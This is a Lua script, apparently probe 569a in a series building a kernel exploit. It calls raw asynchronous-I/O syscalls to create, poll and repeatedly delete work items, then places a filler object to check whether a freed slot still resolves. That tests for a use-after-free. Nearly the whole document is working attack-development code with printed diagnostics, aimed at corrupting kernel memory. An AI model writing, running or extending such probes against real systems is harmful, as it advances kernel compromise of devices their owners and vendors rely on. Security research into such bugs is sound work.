-- CRASH_CLASS: MODERATE
-- PROBE 569a: does the aio slot keep pointing at a freed work item?
--
-- Context: 568a deleted a 100-item block create with count=1 deletes from two
-- helper threads and got status 0 in BOTH helpers for all 100 ids. Serialized
-- second deletes return 0x80020003 (498a, 528a), so a second 0 means the slot
-- still resolves to an object whose context was already cleared -- i.e. the id
-- keeps pointing at memory the delete already freed.
-- This probe walks that sequence serially and watches a filler object.

print("=== PROBE 569a: AIO STALE SLOT ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function sgn(v)
    local l = to_num(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function U(a)
    a = to_num(a)
    return uint64(string.format("0x%08X%08X", math.floor(a / 4294967296), a % 4294967296))
end
local Z = uint64(0)
local function sc(n) return make_syscall(n) end
local function wd(addr, value) memory.write_dword(addr, value) end
local function wq(addr, value) memory.write_qword(addr, value) end
local function rd(addr) return to_num(memory.read_dword(addr)) end
local function rq(addr) return to_num(memory.read_qword(addr)) end
local function hx(v) return string.format("%08X", to_num(v) % 4294967296) end

local function page(n)
    local p = to_num(memory.alloc(n))
    for i = 0, n / 4 - 1 do wd(p + i * 4, 0) end
    return p
end

local reqs = page(0x200)
local data = page(0x200)
local status = page(0x400)
local ids = page(0x40)
local one = page(0x40)
local states = page(0x40)
local RES = page(0x40)
local D = reqs + 0x100
print(string.format("[0] reqs=%08X data=%08X status=%08X ids=%08X one=%08X states=%08X",
    reqs, data, status, ids, one, states))

local path = page(0x20)
wd(path, 0x7665642F) wd(path + 4, 0x6172752F) wd(path + 8, 0x6D6F646E) wd(path + 0xC, 0)
local fd = sgn(sc(5)(U(path), Z, Z, Z, Z, Z))
print(string.format("[A] fd=%d", fd))
if fd < 3 then print("=== 569a ABORT: no fd ===") return end

local function desc(at, len, buf, res)
    wq(at + 0x00, U(0)) wq(at + 0x08, U(len))
    wq(at + 0x10, U(buf)) wq(at + 0x18, U(res))
    wq(at + 0x20, U(fd)) wq(at + 0x28, U(0))
end

-- block create: 4 items, one entry
for i = 0, 3 do desc(D + i * 0x28, 0x10, data + i * 0x40, RES + i * 8) end
local ret = sgn(sc(669)(U(1 + 0x1000), U(D), U(4), U(1), U(ids), Z))
print(string.format("[B] block create ret=%d base=%s", ret, hx(rd(ids))))
local base = rd(ids)
if ret ~= 0 or base == 0 then print("=== 569a ABORT: create failed ===") return end

local function id_of(i) return base + i * 0x10000 end
for i = 0, 3 do
    wd(one, id_of(i))
    pcall(function() sc(664)(U(one), U(1), U(states), Z, Z, Z) end)
    print(string.format("[C] item%d id=%s poll=%s", i, hx(id_of(i)), hx(rd(states))))
end

local function del(id)
    wd(one, id)
    wd(status, 0xA5A5A5A5)
    local r = sgn(sc(662)(U(one), U(1), U(status), Z, Z, Z))
    return r, rd(status)
end

print("[D] serial double delete of item0")
local r1, s1 = del(id_of(0))
local r2, s2 = del(id_of(0))
local r3, s3 = del(id_of(0))
print(string.format("  first  ret=%d status=%s", r1, hx(s1)))
print(string.format("  second ret=%d status=%s", r2, hx(s2)))
print(string.format("  third  ret=%d status=%s", r3, hx(s3)))

print("[E] create a filler, then delete item0 again")
for o = 0, 0x27, 8 do wq(D + o, 0) end
desc(D, 0x10, data + 0x180, RES + 0x20)
local rfill = sgn(sc(669)(U(1), U(D), U(1), U(1), U(ids + 4), Z))
local filler = rd(ids + 4)
print(string.format("  filler ret=%d id=%s", rfill, hx(filler)))
if rfill == 0 then
    wd(one, filler)
    pcall(function() sc(664)(U(one), U(1), U(states), Z, Z, Z) end)
    print(string.format("  filler poll=%s", hx(rd(states))))
end
local r4, s4 = del(id_of(0))
print(string.format("  item0 again ret=%d status=%s", r4, hx(s4)))
if filler ~= 0 then
    local rf, sf = del(filler)
    print(string.format("  filler delete ret=%d status=%s", rf, hx(sf)))
end
for i = 1, 3 do
    local ri, si = del(id_of(i))
    print(string.format("  item%d ret=%d status=%s", i, ri, hx(si)))
end

print(string.format("[F] alive, base[0x10]=%s", hx(rd(base + 0x10))))
print("=== 569a DONE ===")
